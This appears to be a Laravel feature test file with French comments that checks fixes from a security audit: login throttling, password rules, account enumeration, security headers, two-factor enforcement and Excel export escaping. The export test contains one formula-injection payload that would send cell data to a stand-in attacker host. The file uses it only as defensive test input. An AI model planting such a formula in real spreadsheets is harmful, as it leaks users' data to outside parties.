<?php

namespace Tests\Feature;

use App\Models\User;
use App\Support\Excel\Workbook;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Corrections de l'audit de sécurité (novembre 2026) : chaque test rejoue une attaque relevée.
 */
class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->withoutVite();
    }

    public function test_writing_the_same_phone_number_differently_does_not_give_more_login_attempts()
    {
        $hostess = User::factory()->fieldAgent()->create(['phone' => '+237690000001']);

        // 5 essais avec une écriture du numéro…
        foreach (range(1, 5) as $i) {
            $this->post(route('login.store'), ['login' => '690000001', 'password' => "faux-{$i}"]);
        }

        // … le même numéro écrit autrement est bloqué aussi
        foreach (['690 000 001', '+237 690-000-001', '(690)000001'] as $typed) {
            $this->post(route('login.store'), ['login' => $typed, 'password' => 'encore-faux'])->assertTooManyRequests();
        }

        $this->assertGuest();
        $this->assertNotNull($hostess->fresh());
    }

    public function test_a_provisional_password_has_at_least_8_characters()
    {
        $manager = User::factory()->create();

        $this->actingAs($manager)->post(route('personnel.store'), [
            'name' => 'Awa', 'phone' => '690001122', 'role' => 'field_agent',
            'password' => '1234', 'password_confirmation' => '1234',
        ])->assertSessionHasErrors('password');
    }

    public function test_forgot_password_does_not_reveal_which_addresses_have_an_account()
    {
        $user = User::factory()->create();

        $known = $this->from(route('password.request'))->post(route('password.email'), ['email' => $user->email]);
        $unknown = $this->from(route('password.request'))->post(route('password.email'), ['email' => 'personne@inconnu.cm']);

        $known->assertSessionHasNoErrors();
        $unknown->assertSessionHasNoErrors();
        $this->assertSame($known->getSession()->get('status'), $unknown->getSession()->get('status'));
    }

    public function test_every_page_sends_the_security_headers()
    {
        $response = $this->get(route('login'));

        $response->assertHeader('X-Frame-Options', 'SAMEORIGIN');
        $response->assertHeader('Content-Security-Policy', "frame-ancestors 'self'");
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    }

    public function test_pages_do_not_send_the_whole_company_record_with_the_user()
    {
        $hostess = User::factory()->fieldAgent()->create();
        $hostess->company->forceFill(['rejection_reason' => 'Motif interne', 'plan_trial' => true])->save();

        $this->actingAs($hostess)->get(route('terrain.home'))
            ->assertInertia(fn ($page) => $page
                ->missing('auth.user.company')
                ->where('auth.company.name', $hostess->company->name));
    }

    public function test_in_production_a_super_admin_must_turn_on_two_factor_authentication()
    {
        $admin = User::factory()->superAdmin()->create();
        app()->detectEnvironment(fn () => 'production');

        $this->actingAs($admin)->get(route('admin.dashboard'))->assertRedirect(route('security.edit'));
        // La page Sécurité reste accessible (elle demande d'abord de confirmer le mot de passe, sans boucle)
        $this->actingAs($admin)->get(route('security.edit'))->assertRedirect(route('password.confirm'));
        $this->actingAs($admin)->withSession(['auth.password_confirmed_at' => time()])->get(route('security.edit'))->assertOk();

        $admin->forceFill(['two_factor_confirmed_at' => now()])->save();
        $this->actingAs($admin)->get(route('admin.dashboard'))->assertOk();
    }

    public function test_text_typed_by_users_never_becomes_an_excel_formula()
    {
        $path = tempnam(sys_get_temp_dir(), 'motriks').'.xlsx';
        $book = new Workbook($path);
        $book->sheet('Ventes', ['Remarque' => [Workbook::TEXT]], [['=HYPERLINK("https://evil.example/?d="&A1,"Voir")']], ['=1+1']);
        $book->close();

        // Contenu réel de la feuille, tel qu'Excel le lit (le lecteur d'OpenSpout, lui, reprend pour une
        // formule tout texte commençant par « = » : il ne dit rien du fichier)
        $zip = new \ZipArchive;
        $zip->open($path);
        $xml = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        @unlink($path);

        $this->assertStringNotContainsString('<f>', $xml);
        $this->assertStringContainsString('t="inlineStr"><is><t>=HYPERLINK(', $xml);
        $this->assertStringContainsString('t="inlineStr"><is><t>=1+1</t>', $xml);
    }
}
